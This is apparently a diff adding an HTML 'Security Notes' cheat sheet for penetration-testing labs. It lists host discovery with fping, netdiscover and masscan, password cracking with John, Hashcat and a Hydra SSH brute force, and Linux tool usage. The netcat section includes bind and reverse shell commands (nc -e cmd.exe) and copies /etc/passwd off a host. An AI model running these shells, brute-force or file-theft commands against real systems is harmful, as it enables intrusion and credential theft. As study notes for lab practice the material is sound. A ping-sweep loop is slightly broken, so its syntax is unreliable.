+    <p>The Entire Network: (Range 192.168.0.0 - 192.168.0.255)</p>
+    
+    <p>for i in {0..255}; do ping -c 192.117.247.$i | grep &lsquo;from&rsquo;; done</p>
+    
+    <h3>fping</h3>
+    
+    <p>&nbsp;a linux tool for ping sweeps</p>
+    
+    <p>Syntax: (Range 192.168.0.0 - 192.168.0.255)</p>
+    
+    <p>fping -a -g 192.168.0.0 192.168.0.255</p>
+    
+    <p>Or using the netmask:</p>
+    
+    <p>fping -a -g 192.168.0.0/24</p>
+    
+    <p>Parameters:</p>
+    
+    <p>-a &nbsp; - force tool to show only live hosts</p>
+    
+    <p>-g&nbsp; - specifies ping sweep</p>
+    
+    <h3>netdiscover</h3>
+    
+    <p>&nbsp;simple ARP Scanner to scan for live hosts in a network</p>
+    
+    <p>Usage: For finding a device without knowing the IP (ie. a VM).</p>
+    
+    <p>Syntax: (Range 192.168.0.0 - 192.168.0.255)</p>
+    
+    <p>netdiscover -r 192.168.0.0/24</p>
+    
+    <p>More: https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/</p>
+    
+    <h3>Masscan</h3>
+    
+    <p>fast, good for discovering open ports</p>
+    
+    <p>Syntax: Device: 192.168.0.182</p>
+    
+    <p>masscan -p1-65535, U:1-65535 192.168.0.182 --rate=500 -e eth0</p>
+    
+    <p>More:&nbsp; https://kalilinuxtutorials.com/masscan/</p>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="crackingtools">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Cracking Tools</div>
+<div class="card-body">
+<h3>John the Ripper:</h3>
+
+<p>Usage: crack file with username and password hashes</p>
+
+<p>Syntax:</p>
+
+<p>sudo john -wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -rules crackme</p>
+
+<p>Install seclists: sudo apt-get install seclists</p>
+
+<ul>
+	<li>
+	<p>wordlist - the hashes to compare to</p>
+	</li>
+	<li>
+	<p>rules - allows changing of cases, ints to be added, etc</p>
+	</li>
+	<li>
+	<p>crackme is file with hashes</p>
+	</li>
+</ul>
+
+<h3>Hashcat:</h3>
+
+<p>Usage: crack file with username and password hashes</p>
+
+<p>Syntax: You must know the type of hash. Find at https://hashcat.net/wiki/doku.php?id=example_hashes</p>
+
+<p>Hashcat -m [HASH TYPE] -a 0 --force [FILE WITH HASHES] [DICTIONARY LOCATION]</p>
+
+<p>-m - hash type, look up on wiki</p>
+
+<p>- a - number of accelerators</p>
+
+<p>-o [FILENAME] - save results to outfile</p>
+
+<p>//Note force is graphics card specific</p>
+
+<h3>Hydra:</h3>
+
+<p>Usage: For services like ssh, ftp, ... when you know username but not password</p>
+
+<p>Syntax:&nbsp;</p>
+
+<p>hydra -l [USERNAME or LIST OF USERS] -p /path/to/dict [SERVICE]://[IP ADDRESS]</p>
+
+<p>ie.</p>
+
+<p>hydra -l root -p /usr/seclists/Leaked-Databases/Passwords/rockyou-10.txt ssh://192.168.0.10</p>
+
+<p>-l - user or list of users</p>
+
+<p>- p - password list</p>
+
+<p>[SERVICE] - target service</p>
+
+<p>[IP ADDRESS] - target ip address</p>
+
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="linuxtools">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Linux Tools</div>
+<div class="card-body">
+
+    <h3>ssh</h3>
+
+    <p><strong>Usage:</strong> Connect to ssh server</p>
+    
+    <p>Syntax:</p>
+    
+    <p>ssh -v -p [PORT NUMBER] -C [USER]@[SERVER IP or DOMAIN NAME]</p>
+    
+    <p>- v - verbose (optional)</p>
+    
+    <p>- p - specify port number if not default port</p>
+    
+    <p>- C - compression, for speed</p>
+    
+    <p>ie.</p>
+    
+    <p>ssh -p 22 root@192.168.0.182</p>
+    
+    <h3>scp</h3>
+    
+    <p><strong>Usage:</strong> File upload or download tool</p>
+    
+    <p>Syntax:</p>
+    
+    <p>scp [USER]@[IP ADDRESS]:[FILE LOCATION] [DESTINATION LOCATION]</p>
+    
+    <p>ie.</p>
+    
+    <p>scp root@192.168.99.22:/etc/passwd .passwd_file</p>
+    
+    <h3>netcat: nc and ncat</h3>
+    
+    <p><strong>Usage:</strong> Create sockets and send requests</p>
+    
+    <p>Syntax: Create listening socket</p>
+    
+    <p>nc -l [PORT]</p>
+    
+    <p>Connect to listening socket:</p>
+    
+    <p>nc [IP ADDRESS] [PORT]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Transferring files:</p>
+    
+    <p>Syntax: Create socket:</p>
+    
+    <p>cat [FILENAME] | nc -l [PORT]</p>
+    
+    <p>Connect to listening socket:</p>
+    
+    <p>nc [IP ADDRESS] [PORT] &gt; [FILENAME]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Transferring files, with progress indicator:</p>
+    
+    <p>Syntax: Create socket:</p>
+    
+    <p>cat [FILENAME] | pv -b | nc -l [PORT]</p>
+    
+    <p>Connect to listening socket:</p>
+    
+    <p>nc [IP ADDRESS] [PORT] | pv -b &gt; [FILENAME]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Send GET requests:</p>
+    
+    <p>Syntax: Create socket:</p>
+    
+    <p>nc [IP ADDRESS] [PORT]</p>
+    
+    <p>GET /[FILE NAME] HTTP/1.1</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> File transfer with netcat</p>
+    
+    <p>Send file from Windows VM to kali</p>
+    
+    <p>Syntax: Create socket:</p>
+    
+    <p>nc [IP ADDRESS] [PORT] &lt; [FILENAME]</p>
+    
+    <p>Retrieve the file:</p>
+    
+    <p>nc -lvp [PORT] &gt; [file]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p>Remote Shell (bind shell) :</p>
+    
+    <ul>
+      <li>
+      <p>Binding a shell to a local port on one machine, and another machine connects to that port to remotely use the shell.</p>
+      </li>
+    </ul>
+    
+    <p>Reverse Shell:</p>
+    
+    <ul>
+      <li>
+      <p>You tell the shell to connect back to your machine which is listening for connection ready for exploitation.</p>
+      </li>
+    </ul>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Remote Shell</p>
+    
+    <p>Syntax:</p>
+    
+    <p>Windows:</p>
+    
+    <p>nc -lvp [PORT] -e cmd.exe</p>
+    
+    <p>Kali:</p>
+    
+    <p>nc [IP ADDRESS] [PORT]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Reverse Shell</p>
+    
+    <p>Syntax:</p>
+    
+    <p>Windows:</p>
+    
+    <p>nc [IP ADDRESS] [PORT] -e cmd.exe</p>
+    
+    <p>Kali:</p>
+    
+    <p>ncat -lvp [PORT]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Sending POST requests</p>
+    
+    <p>Syntax:</p>
+    
+    <p>head = &ldquo;POST /[FILENAME] HTTP/1.1\r\nHost: &hellip; \r\n Authorization: &hellip;&rdquo;; echo $head | nc [SITE] [PORT]</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Download file from server using HTTP, HTTPS, FTP</p>
+    
+    <p>Syntax:</p>
+    
+    <p>wget [URL]</p>
+    
+    <p>ie.</p>
+    
+    <p>wget //10.10.10.153/images/5.png</p>
+    
+    <p>&nbsp;</p>
+    
+    <h3>curl</h3>
+    
+    <p><strong>Usage:</strong> &ldquo;Connect&rdquo; to url</p>
+    
+    <p>Syntax:</p>
+    
+    <p>curl [URL]</p>
+    
+    <p>curl [URL] &gt; [OUTFILE]</p>
+    
+    <p>ie.</p>
+    
+    <p>curl somesite.com</p>
+    
+    <p>curl somesite.com &gt; somesiteindex.html</p>
+    
+    <p><strong>Usage:</strong> Show request and response header</p>
+    
+    <p>Syntax:</p>
+    
+    <p>curl -v &lt;URL&gt;</p>
+    
+    <p><strong>Usage:</strong> Test URL with injecting header</p>
+    
+    <p>Syntax:</p>
+    
+    <p>curl --header &lsquo;Content-Type: application/json&rsquo; [URL]</p>
+    
+    <h3>base64</h3>
+    
+    <p><strong>Usage:</strong> Encode text in base64</p>
+    
+    <p>Syntax:</p>
+    
+    <p>base64 [FILENAME]</p>
+    
+    <p>echo &ldquo;sometext&rdquo; | base64</p>
+    
+    <p><strong>Usage:</strong> Decode from base64</p>
+    
+    <p>Syntax:</p>
+    
+    <p>base64 -d [FILENAME]</p>
+    
+    <p>echo &ldquo;sometext&rdquo; | base64 -d</p>
+    
+    <h3>Connecting to SQL servers</h3>
+    
+    <p><strong>Usage:</strong> Connect to remote mysql server</p>
+    
+    <p>Syntax:</p>
+    
+    <p>&nbsp;mysql -u USERNAME -p&rsquo;PASSWORD&rsquo; -h REMOTE_SERVER_IP -D DB_NAME</p>
+    
+    <h3>find</h3>
+    
+    <p><strong>Usage:</strong> Find by name</p>
+    
+    <p>Syntax:</p>
+    
+    <p>&nbsp;find . -name FILENAME</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Find by file type</p>
+    
+    <p>Syntax:</p>
+    
+    <p>&nbsp;find . -name *.[FILETYPE]</p>
+    
+    <p>ie.</p>
+    
+    <p>find /home -name *.jpg</p>
+    
+    <p>Combine file type and file name:</p>
+    
+    <p>find . -name [FILENAME] -type f (f for file, d for dir)</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Find by file type</p>
+    
+    <p>Syntax:</p>
+    
+    <p>Search multiple file types:</p>
+    
+    <p>find . -type f \( -name &ldquo;*.[FILETYPE]&rdquo; -o -name &ldquo;*.[FILETYPE]&rdquo; \)</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong> Find by modification time by user</p>
+    
+    <p>Syntax:</p>
+    
+    <p>&nbsp;find . -user USERNAME -mtime 7 -iname FILETYPE</p>
+    
+    <p>ie.</p>
+    
+    <p>find /home -user root -mtime 7 -iname &ldquo;.db&rdquo;</p>
+    
+    <p>&nbsp;</p>
+    
+    <p><strong>Usage:</strong>&nbsp; Search by permissions</p>
+    
+    <p>Syntax:</p>
+    
+    <p>find -perm [PERMISSION]</p>
+    
+    <p>ie:</p>
+    
+    <p>find . -name &ldquo;root.exe&rdquo; -perm 777</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>
+    function openSection(evt, sName) {
+              var i, tabcontent, tablinks;
+              tabcontent = document.getElementsByClassName("col-lg-9");
+              for (i = 0; i < tabcontent.length; i++) {
+                  tabcontent[i].style.display = "none";
+              }
+              tablinks = document.getElementsByClassName("list-group-item list-group-item-action");
+              for (i = 0; i < tablinks.length; i++) {
+                  tablinks[i].className = tablinks[i].className.replace(" active", "");
+              }
+              document.getElementById(sName).style.display = "inline-block";
+              evt.currentTarget.className += " active";
+          }
+          
+          // Get the element with id="defaultOpen" and click on it
+          document.getElementById("defaultOpen").click();
+  </script>
+</main>
+<script src="../public/js/jquery.min.js"></script>
+<script src="../public/js/bootstrap.min.js"></script> 
+</body>
+</html>
